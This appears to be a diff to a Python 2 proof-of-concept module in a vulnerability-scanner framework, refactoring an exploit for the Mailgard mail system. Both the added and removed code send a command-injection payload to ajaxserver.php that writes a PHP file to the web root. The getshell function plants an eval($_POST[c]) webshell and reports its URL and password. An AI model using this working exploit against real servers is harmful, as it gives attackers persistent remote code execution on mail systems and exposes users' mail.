@@ -21,11 +21,13 @@ class Vuln(ABVuln):
     product = 'Mailgard'  # 漏洞应用名称
     product_version = 'Unkonwn'  # 漏洞应用版本
 
+
 def login(target,username,password):
     login_request = ''
     global sessionid
-    domain = target[(target.index('.')+1):(target.index(':',6))]
-    print 'domain=' + domain
+    domain = target.split(".")[1]
+
+    # print 'domain=' + domain
     login_url = target + 'index.php'
     post_data = 'txtname=' + username + '&domain=' + domain + '&txtpwd=' + password + '&languages=zh-cn&button=%E7%99%BB+%E5%BD%95'
     try:
@@ -35,50 +37,12 @@ def login(target,username,password):
             sessionid = login_request.cookies['PHPSESSID']
             return sessionid
         else:
-            print 'login failed,please check username and password'
+            # print 'login failed,please check username and password'
             return False
     except Exception,e:   
         print Exception,":",e
         return False
 
-def verify(target,sessionid):
-    getshell_request = ''
-    fuckurl = target + 'src/ajaxserver.php?exec=recall'
-    getshell_header = {'cookie': 'MAILSESSID=' + str(sessionid) + '; PHPSESSID=' + str(sessionid)}
-    getshell_data = 'user=1\'|echo \'<?php echo md5(c); ?>\'>/var/www/newmail/shell123.php #&messageid=1'
-    # print getshell_data
-    try:
-        getshell_request = requests.post(fuckurl,getshell_data,headers=getshell_header,allow_redirects=False,verify=False)
-        r = requests.get(target + '/shell123.php', verify=False)
-
-        if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
-            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                target=self.target, name=self.vuln.name))
-
-    except Exception,e:   
-        print Exception,":",e
-        return False
-
-def getshell(target,sessionid):
-    getshell_request = ''
-    fuckurl = target + 'src/ajaxserver.php?exec=recall'
-    getshell_header = {'cookie': 'MAILSESSID=' + str(sessionid) + '; PHPSESSID=' + str(sessionid)}
-    getshell_data = 'user=1\'|echo \'<?php eval($_POST[c]);echo md5(c); ?>\'>/var/www/newmail/shell123.php #&messageid=1'
-    # print getshell_data
-    try:
-        getshell_request = requests.post(fuckurl,getshell_data,headers=getshell_header,allow_redirects=False,verify=False)
-        verify_url = target + '/shell123.php'
-        r = requests.get(url, verify=False)
-
-        if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text: 
-            self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
-                target=self.target, name=self.vuln.name, url=verify_url))
-        else:
-            print 'getshell failed!'
-
-    except Exception,e:   
-        print Exception,":",e
-        return False
 
 class Poc(ABPoc):
     poc_id = '7de2ab79-1025-4433-ade9-280167ea6bec'
@@ -87,6 +51,44 @@ class Poc(ABPoc):
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
+
+    def myverify(self, target,sessionid):
+        getshell_request = ''
+        fuckurl = target + 'src/ajaxserver.php?exec=recall'
+        getshell_header = {'cookie': 'MAILSESSID=' + str(sessionid) + '; PHPSESSID=' + str(sessionid)}
+        getshell_data = 'user=1\'|echo \'<?php echo md5(c); ?>\'>/var/www/newmail/shell123.php #&messageid=1'
+        # print getshell_data
+        try:
+            getshell_request = requests.post(fuckurl,getshell_data,headers=getshell_header,allow_redirects=False,verify=False)
+            r = requests.get(target + '/shell123.php', verify=False)
+            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
+
+        except Exception,e:   
+            print Exception,":",e
+            return False
+        
+    def getshell(self, target,sessionid):
+        getshell_request = ''
+        fuckurl = target + 'src/ajaxserver.php?exec=recall'
+        getshell_header = {'cookie': 'MAILSESSID=' + str(sessionid) + '; PHPSESSID=' + str(sessionid)}
+        getshell_data = 'user=1\'|echo \'<?php eval($_POST[c]);echo md5(c); ?>\'>/var/www/newmail/shell123.php #&messageid=1'
+        # print getshell_data
+        try:
+            getshell_request = requests.post(fuckurl,getshell_data,headers=getshell_header,allow_redirects=False,verify=False)
+            verify_url = target + '/shell123.php'
+            r = requests.get(verify_url, verify=False)
+
+            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text: 
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
+                    target=self.target, name=self.vuln.name, url=verify_url))
+            else:
+                print 'getshell failed!'
+
+        except Exception,e:   
+            print Exception,":",e
+            return False
 
     def verify(self):
         try:
@@ -99,7 +101,7 @@ class Poc(ABPoc):
             if (login(target,username,password)):
                 print 'sessionid=' + sessionid
                 #verify
-                verify(target,sessionid)
+                self.myverify(target,sessionid)
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
@@ -115,7 +117,7 @@ class Poc(ABPoc):
             if (login(target,username,password)):
                 print 'sessionid=' + sessionid
                 #verify
-                getshell(target,sessionid)
+                self.getshell(target,sessionid)
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
